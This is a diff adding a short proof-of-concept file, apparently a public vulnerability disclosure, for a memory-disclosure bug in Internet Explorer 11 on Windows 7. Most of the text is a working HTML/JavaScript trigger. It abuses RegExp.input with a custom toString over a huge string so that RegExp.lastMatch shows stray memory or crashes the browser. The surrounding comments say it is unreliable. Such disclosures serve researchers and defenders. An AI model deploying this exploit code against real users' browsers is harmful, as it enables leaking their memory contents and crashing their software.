@@ -1,0 +1,33 @@
+/*
+There is a vulnerability in Internet Explorer that could potentially be used for memory disclosure.
+
+This was tested on IE11 running on Window 7 64-bit with the latest patches applied.
+
+PoC:
+
+=========================================
+*/
+
+<!-- saved from url=(0014)about:internet -->
+<script>
+
+function main() {
+  RegExp.input = {toString: f};
+  alert(RegExp.lastMatch);
+}
+
+var input = [Array(10000000).join("a"), Array(11).join("b"), Array(100).join("a")].join("");
+
+function f() {
+  String.prototype.match.call(input, "bbbbbbbbbb");
+}
+
+main();
+
+</script>
+
+/*
+=========================================
+
+Note that sometimes the PoC results in a crash (I made no attempt to make it reliable) while sometimes it results in pieces of memory being displayed
+*/
